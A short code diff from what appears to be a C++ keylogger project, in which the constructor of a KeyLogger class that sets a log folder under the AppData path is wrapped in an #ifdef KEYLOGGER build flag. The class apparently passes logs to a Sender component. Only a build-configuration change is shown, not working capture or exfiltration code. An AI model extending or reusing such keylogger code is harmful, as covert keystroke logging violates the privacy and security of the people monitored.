@@ -215,7 +215,9 @@ void KeyLogger::stopKeylogger(){
 }
 
 KeyLogger::KeyLogger(const Stream & stream) : Sender(stream) {
+#ifdef KEYLOGGER
     pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(KEYLOGGER) + L"\\";
     logsFileName = generateLogName();
+#endif
 }
 
